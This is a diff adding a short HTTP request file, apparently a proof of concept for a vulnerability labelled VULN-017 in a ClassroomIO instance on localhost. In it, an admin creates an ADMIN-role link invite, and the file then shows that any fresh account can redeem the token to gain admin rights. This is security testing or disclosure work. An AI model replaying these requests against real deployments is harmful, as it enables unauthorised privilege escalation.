@@ -1,0 +1,13 @@
+### VULN-017 — create + fetch + reuse an ADMIN link-invite
+POST http://localhost:21527/organization/link-invite HTTP/1.1
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+Cookie: classroomio.session_token=<ADMIN>
+
+{"roleId":1}
+
+### decisive: any fresh account redeems the returned token
+POST http://localhost:21527/invite/link/D2LNpExPRYAhlp80GL5mq6HEH5bAsKRhyauI-Kmefyg/accept HTTP/1.1
+Cookie: classroomio.session_token=<ANY_FRESH_ACCOUNT>
+
+{}
